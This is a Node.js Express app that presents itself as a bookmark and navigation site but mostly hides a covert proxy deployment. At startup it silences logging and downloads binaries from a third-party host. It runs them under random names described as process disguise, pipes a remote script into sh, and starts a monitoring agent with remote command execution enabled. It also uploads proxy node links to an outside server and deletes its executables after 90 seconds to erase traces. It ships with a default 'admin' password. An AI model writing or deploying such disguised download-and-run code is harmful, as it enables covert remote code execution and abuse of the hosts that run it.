const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);

// 屏蔽默认控制台日志
const originalLog = console.log;
console.log = function() {};

// 环境变量与基本配置
const UPLOAD_URL = process.env.UPLOAD_URL || '';
const PROJECT_URL = process.env.PROJECT_URL || '';
const AUTO_ACCESS = process.env.AUTO_ACCESS || false;
const FILE_PATH = process.env.FILE_PATH || 'data';
const SUB_PATH = process.env.SUB_PATH || 'sub';
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const UUID = process.env.UUID || '9afd1229-b893-40c1-84dd-51e7ce204913';

// 哪吒探针配置
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';
const NEZHA_PORT = process.env.NEZHA_PORT || '';
const NEZHA_KEY = process.env.NEZHA_KEY || '';

// Cloudflare Argo 配置
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';
const ARGO_AUTH = process.env.ARGO_AUTH || '';
const ARGO_PORT = process.env.ARGO_PORT || 8001;
const CFIP = process.env.CFIP || 'cdns.doon.eu.org';
const CFPORT = process.env.CFPORT || 443;
const NAME = process.env.NAME || '';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin';

// CFSM 监控配置
const CFSM_ID = process.env.CFSM_ID || '';
const CFSM_SECRET = process.env.CFSM_SECRET || '';
const CFSM_URL = process.env.CFSM_URL || '';
const CFSM_COLLECT_INTERVAL = process.env.CFSM_COLLECT_INTERVAL || '0';
const CFSM_INTERVAL = process.env.CFSM_INTERVAL || '60';
const CFSM_CONNECTION_MODE = process.env.CFSM_CONNECTION_MODE || 'auto';
const CFSM_PING_MODE = process.env.CFSM_PING_MODE || 'tcp';
const CFSM_RESET_DAY = process.env.CFSM_RESET_DAY || '1';
const CFSM_AUTO_UPDATE = process.env.CFSM_AUTO_UPDATE || '0';
const CFSM_CT = process.env.CFSM_CT || 'gd-ct-dualstack.ip.zstaticcdn.com';
const CFSM_CU = process.env.CFSM_CU || 'gd-cu-dualstack.ip.zstaticcdn.com';
const CFSM_CM = process.env.CFSM_CM || 'gd-cm-dualstack.ip.zstaticcdn.com';

// 创建工作目录
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH, { recursive: true });
}

// 生成随机程序名（用于进程伪装）
function generateRandomName() {
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

const npmName = generateRandomName();
const webName = generateRandomName();
const botName = generateRandomName();
const phpName = generateRandomName();

let npmPath = path.join(FILE_PATH, npmName);
let phpPath = path.join(FILE_PATH, phpName);
let webPath = path.join(FILE_PATH, webName);
let botPath = path.join(FILE_PATH, botName);
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');

// 删除已上传节点
function deleteNodes() {
  try {
    if (!UPLOAD_URL || !fs.existsSync(subPath)) return;
    let fileContent = fs.readFileSync(subPath, 'utf-8');
    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));
    if (nodes.length === 0) return;

    axios.post(`${UPLOAD_URL}/api/delete-nodes`, JSON.stringify({ nodes }), {
      headers: { 'Content-Type': 'application/json' }
    }).catch(() => {});
  } catch (err) {}
}

// 清理旧文件
function cleanupOldFiles() {
  try {
    const files = fs.readdirSync(FILE_PATH);
    files.forEach(file => {
      if (file === 'bookmarks.json') return;
      const filePath = path.join(FILE_PATH, file);
      if (fs.statSync(filePath).isFile()) fs.unlinkSync(filePath);
    });
  } catch (err) {}
}

// 生成核心配置文件 config.json
async function generateConfig() {
  const config = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      {
        port: ARGO_PORT,
        protocol: 'vless',
        settings: {
          clients: [{ id: UUID, flow: 'xtls-rprx-vision' }],
          decryption: 'none',
          fallbacks: [
            { dest: 3001 },
            { path: "/vless-argo", dest: 3002 },
            { path: "/vmess-argo", dest: 3003 },
            { path: "/trojan-argo", dest: 3004 }
          ]
        },
        streamSettings: { network: 'tcp' }
      },
      {
        port: 3001, listen: "127.0.0.1", protocol: "vless",
        settings: { clients: [{ id: UUID }], decryption: "none" },
        streamSettings: { network: "tcp", security: "none" }
      },
      {
        port: 3002, listen: "127.0.0.1", protocol: "vless",
        settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" },
        streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } },
        sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false }
      },
      {
        port: 3003, listen: "127.0.0.1", protocol: "vmess",
        settings: { clients: [{ id: UUID, alterId: 0 }] },
        streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } },
        sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false }
      },
      {
        port: 3004, listen: "127.0.0.1", protocol: "trojan",
        settings: { clients: [{ password: UUID }] },
        streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } },
        sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false }
      }
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [{ protocol: "freedom", tag: "direct" }, { protocol: "blackhole", tag: "block" }]
  };
  fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));
}

// 检测 CPU 架构
function getSystemArchitecture() {
  const arch = os.arch();
  return (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') ? 'arm' : 'amd';
}

// 下载单文件工具
function downloadFile(fileName, fileUrl, callback) {
  const writer = fs.createWriteStream(fileName);
  axios({ method: 'get', url: fileUrl, responseType: 'stream' })
    .then(response => {
      response.data.pipe(writer);
      writer.on('finish', () => { writer.close(); callback(null, fileName); });
      writer.on('error', err => { fs.unlink(fileName, () => {}); callback(err.message); });
    })
    .catch(err => callback(err.message));
}

// 下载主应用文件并后台运行
async function downloadFilesAndRun() {
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);
  if (filesToDownload.length === 0) return;

  try {
    await Promise.all(filesToDownload.map(f => new Promise((res, rej) => downloadFile(f.fileName, f.fileUrl, (e) => e ? rej(e) : res()))));
  } catch (err) { return; }

  // 赋予执行权限
  const filesToAuthorize = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath];
  filesToAuthorize.forEach(f => fs.existsSync(f) && fs.chmodSync(f, 0o775));

  // 启动哪吒探针
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const nezhatls = ['443', '8443', '2096', '2087', '2083', '2053'].includes(port) ? 'true' : 'false';
      const configYaml = `client_secret: ${NEZHA_KEY}\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: ${NEZHA_SERVER}\nskip_connection_count: true\nskip_procs_count: true\ntemperature: false\ntls: ${nezhatls}\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: ${UUID}`;
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
      await exec(`nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`).catch(() => {});
    } else {
      const NEZHA_TLS = ['443', '8443', '2096', '2087', '2083', '2053'].includes(NEZHA_PORT) ? '--tls' : '';
      await exec(`nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`).catch(() => {});
    }
  }

  // 启动节点后端程序
  await exec(`nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`).catch(() => {});

  // 启动 Argo 隧道
  if (fs.existsSync(botPath)) {
    let args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
    }
    await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`).catch(() => {});
  }
}

// 依据架构获取下载文件列表
function getFilesForArchitecture(architecture) {
  const isArm = architecture === 'arm';
  const baseUrl = isArm ? "https://arm64.ssss.nyc.mn" : "https://amd64.ssss.nyc.mn";
  let baseFiles = [
    { fileName: webPath, fileUrl: `${baseUrl}/web` },
    { fileName: botPath, fileUrl: `${baseUrl}/bot` }
  ];

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) baseFiles.unshift({ fileName: npmPath, fileUrl: `${baseUrl}/agent` });
    else baseFiles.unshift({ fileName: phpPath, fileUrl: `${baseUrl}/v1` });
  }
  return baseFiles;
}

// 配置 Argo 隧道参数
function argoType() {
  if (!ARGO_AUTH || !ARGO_DOMAIN) return;
  if (ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
    const tunnelYaml = `\n  tunnel: ${ARGO_AUTH.split('"')[11]}\n  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}\n  protocol: http2\n  ingress:\n    - hostname: ${ARGO_DOMAIN}\n      service: http://localhost:${ARGO_PORT}\n      originRequest:\n        noTLSVerify: true\n    - service: http_status:404\n  `;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  }
}

// 获取/解析 Argo 域名
async function extractDomains() {
  if (ARGO_AUTH && ARGO_DOMAIN) {
    await generateLinks(ARGO_DOMAIN);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
      const domainMatch = fileContent.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
      if (domainMatch) {
        await generateLinks(domainMatch[1]);
      } else {
        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
        await exec(process.platform === 'win32' ? `taskkill /f /im ${botName}.exe > nul 2>&1` : `pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`).catch(() => {});
        await new Promise(r => setTimeout(r, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
        await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`).catch(() => {});
        await new Promise(r => setTimeout(r, 3000));
        await extractDomains();
      }
    } catch (error) {}
  }
}

// 获取本地节点的地理位置及 IP 信息
async function getMetaInfo() {
  try {
    const res = await axios.get('https://api.ip.sb/geoip', { headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 3000 });
    if (res.data?.country_code && res.data?.isp) return `${res.data.country_code}-${res.data.isp}`.replace(/\s+/g, '_');
  } catch (e) {
    try {
      const res2 = await axios.get('http://ip-api.com/json', { headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 3000 });
      if (res2.data?.countryCode && res2.data?.org) return `${res2.data.countryCode}-${res2.data.org}`.replace(/\s+/g, '_');
    } catch (err) {}
  }
  return 'Unknown';
}

// 生成节点链接并储存订阅
async function generateLinks(argoDomain) {
  const ISP = await getMetaInfo();
  const nodeName = NAME ? `${NAME}-${ISP}` : ISP;

  setTimeout(() => {
    const VMESS = { v: '2', ps: nodeName, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'auto', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox' };
    const subTxt = `vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}\n\nvmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}\n\ntrojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}\n`;

    fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
    uploadNodes();

    // 订阅接口路由
    app.get(`/${SUB_PATH}`, (req, res) => {
      res.set('Content-Type', 'text/plain; charset=utf-8');
      res.send(Buffer.from(subTxt).toString('base64'));
    });
  }, 2000);
}

// 上传节点至主服务器
async function uploadNodes() {
  if (UPLOAD_URL && PROJECT_URL) {
    axios.post(`${UPLOAD_URL}/api/add-subscriptions`, { subscription: [`${PROJECT_URL}/${SUB_PATH}`] }).catch(() => {});
  } else if (UPLOAD_URL && fs.existsSync(listPath)) {
    const nodes = fs.readFileSync(listPath, 'utf-8').split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));
    if (nodes.length > 0) axios.post(`${UPLOAD_URL}/api/add-nodes`, JSON.stringify({ nodes })).catch(() => {});
  }
}

// 延迟 90 秒删除可执行文件（清理运行痕迹）
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, webPath, botPath];
    if (NEZHA_PORT) filesToDelete.push(npmPath);
    else if (NEZHA_SERVER && NEZHA_KEY) filesToDelete.push(phpPath);

    const cmd = process.platform === 'win32' ? `del /f /q ${filesToDelete.join(' ')}` : `rm -rf ${filesToDelete.join(' ')}`;
    exec(`${cmd} >/dev/null 2>&1`, () => {});
  }, 90000);
}
cleanFiles();

// 添加外部保活访问任务
async function AddVisitTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) return;
  axios.post('https://oooo.serv00.net/add-url', { url: PROJECT_URL }).catch(() => {});
}

// 安装 CFSM Agent 监控程序
async function installCfsmAgent() {
  const id = CFSM_ID.trim();
  const secret = CFSM_SECRET.trim();
  if (!id || !secret) return;

  const args = [`install`, `-id=${id}`, `-secret=${secret}`];
  if (CFSM_URL.trim()) args.push(`-url=${CFSM_URL.trim()}`);
  args.push(`-collect_interval=${CFSM_COLLECT_INTERVAL.trim()}`, `-interval=${CFSM_INTERVAL.trim()}`, `-connection_mode=${CFSM_CONNECTION_MODE.trim()}`, `-ping_mode=${CFSM_PING_MODE.trim()}`, `-reset_day=${CFSM_RESET_DAY.trim()}`, `-auto_update=${CFSM_AUTO_UPDATE.trim()}`, `-ct=${CFSM_CT.trim()}`, `-cu=${CFSM_CU.trim()}`, `-cm=${CFSM_CM.trim()}`);

  exec(`curl -fsSL 'https://raw.githubusercontent.com/llodys/node-nav/refs/heads/main/cfsm-agent-install.sh' | sh -s -- ${args.join(' ')}`).catch(() => {});
}

// 启动主流程
async function startserver() {
  try {
    argoType();
    deleteNodes();
    cleanupOldFiles();
    await generateConfig();
    await installCfsmAgent();
    await downloadFilesAndRun();
    await extractDomains();
    await AddVisitTask();
  } catch (error) {}
}
startserver();

// Web 导航页/书签功能实现
const BOOKMARKS_FILE = path.join(__dirname, FILE_PATH, 'bookmarks.json');

app.use(express.json({ limit: '10mb' }));
app.use('/css', express.static(path.join(__dirname, 'public', 'css')));
app.use('/js', express.static(path.join(__dirname, 'public', 'js')));

const readBookmarks = () => fs.existsSync(BOOKMARKS_FILE) ? JSON.parse(fs.readFileSync(BOOKMARKS_FILE, 'utf8')) : {};
const writeBookmarks = data => {
  try {
    const dir = path.dirname(BOOKMARKS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(BOOKMARKS_FILE, JSON.stringify(data, null, 2), 'utf8');
    return true;
  } catch (e) { return false; }
};

// 密码验证
app.post('/check-password', (req, res) => res.json({ success: req.body.password === ADMIN_PASSWORD, message: req.body.password === ADMIN_PASSWORD ? undefined : '密码错误' }));

// 书签 API
app.get('/api/bookmarks', (req, res) => res.json(readBookmarks()));
app.post('/api/bookmarks', (req, res) => {
  if (req.body.password !== ADMIN_PASSWORD) return res.status(401).json({ success: false, message: '无权操作' });
  if (writeBookmarks(req.body.bookmarksData)) res.json({ success: true, message: '保存成功' });
  else res.status(500).json({ success: false, message: '保存失败' });
});

// 前端页面路由
app.get("/login", async (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get("/admin", async (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get("/", async (req, res) => {
  const indexPath = path.join(__dirname, 'public', 'index.html');
  if (fs.existsSync(indexPath)) res.sendFile(indexPath);
  else res.send(`Hello world!<br><br>You can access /${SUB_PATH} to get your nodes!`);
});

// 启动服务
app.listen(PORT, () => {
  originalLog('🚀 Node Nav 启动！');
  originalLog(`🔗 访问地址: http://localhost:${PORT}`);
});
